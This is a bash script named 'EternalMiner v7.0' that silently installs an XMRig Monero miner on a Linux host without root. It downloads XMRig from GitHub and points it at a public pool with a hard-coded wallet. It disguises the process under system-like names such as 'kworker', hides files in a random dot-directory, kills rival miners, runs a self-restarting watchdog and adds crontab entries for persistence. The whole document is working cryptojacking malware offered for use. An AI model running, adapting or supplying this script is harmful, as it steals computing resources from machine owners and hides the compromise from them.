#!/bin/bash
# EternalMiner v7.0 Non-Root - Works on restricted VPS, silent, persistent

WALLET="45pLvfDjyHNLrhd5ekuqZdRUmjkd6ypocYUV8mRaTS5kQGRoWKtUTYg6VpNaCMSmsKWtympm9ruh6Hv55HCuSDXE12NEfwg"
POOL="pool.supportxmr.com:3333"
CPU_LIMIT=75

# Non-root only
if [[ $EUID -eq 0 ]]; then
    echo "Run as normal user, not root"
    exit 0
fi

# Random names
PROCESS_NAMES=("kworker" "dbus-helper" "system-log" "rng-helper" "audit-helper")
SERVICE_NAME="cache-update"
RAND=$((RANDOM % 5))
PROCESS_NAME="${PROCESS_NAMES[$RAND]}"
INSTALL_DIR="$HOME/.config/.cache_${PROCESS_NAME}_$(tr -dc 'a-f0-9' < /dev/urandom | head -c 12)"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

echo "[+] Starting silent mining setup..."

# Kill old miners
pkill -9 -f xmrig 2>/dev/null || true
pkill -9 -f "${PROCESS_NAME}" 2>/dev/null || true

# Download XMRig (latest compatible)
ARCH=$(uname -m)
if [[ "$ARCH" == "x86_64" ]]; then
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-x86_64.tar.gz -o x.tar.gz || \
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x86_64.tar.gz -o x.tar.gz
elif [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-aarch64.tar.gz -o x.tar.gz || \
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-aarch64.tar.gz -o x.tar.gz
else
    exit 0
fi

tar -xzf x.tar.gz --strip-components=1 >/dev/null 2>&1
rm -f x.tar.gz SHA256* *.md LICENSE 2>/dev/null

cat > config.json <<EOF
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": ${CPU_LIMIT},
        "huge-pages": false,
        "hw-aes": true,
        "yield": true
    },
    "opencl": false,
    "cuda": false,
    "pools": [{
        "url": "${POOL}",
        "user": "${WALLET}",
        "pass": "$(hostname | tr -dc '[:alnum:]')-$(whoami)",
        "keepalive": true,
        "tls": false
    }],
    "donate-level": 0,
    "print-time": 180,
    "log-file": null,
    "background": true
}
EOF

mv xmrig "$PROCESS_NAME" 2>/dev/null || exit 0
chmod +x "$PROCESS_NAME"

# Self-healing watchdog script
cat > watch.sh <<'EOF'
#!/bin/bash
MINER_PATH="$1"
CONFIG_PATH="$2"
while true; do
    if ! pgrep -f "$(basename "$MINER_PATH")" > /dev/null; then
        nice -n 19 "$MINER_PATH" --config="$CONFIG_PATH" >/dev/null 2>&1 &
    fi
    sleep 15
done
EOF
chmod +x watch.sh

# Start miner + watchdog
nohup ./watch.sh "$(pwd)/${PROCESS_NAME}" "$(pwd)/config.json" >/dev/null 2>&1 &

# Persistence via user crontab
CRON_CMD="@reboot nohup ${INSTALL_DIR}/watch.sh ${INSTALL_DIR}/${PROCESS_NAME} ${INSTALL_DIR}/config.json >/dev/null 2>&1 &"
(crontab -l 2>/dev/null | grep -v "watch.sh"; echo "$CRON_CMD") | crontab -

# Backup persistence (every 2 minutes)
CRON_WATCH="*/2 * * * * nohup ${INSTALL_DIR}/watch.sh ${INSTALL_DIR}/${PROCESS_NAME} ${INSTALL_DIR}/config.json >/dev/null 2>&1 &"
(crontab -l 2>/dev/null | grep -v "watch.sh"; echo "$CRON_WATCH") | crontab -

echo "[+] EternalMiner v7.0 deployed successfully (non-root)"
echo "[+] Wallet: ${WALLET}"
echo "[+] Process: ${PROCESS_NAME}"
echo "[+] Persistence: Watchdog + User Crontab"
echo "[+] Check with: ps aux | grep ${PROCESS_NAME}"

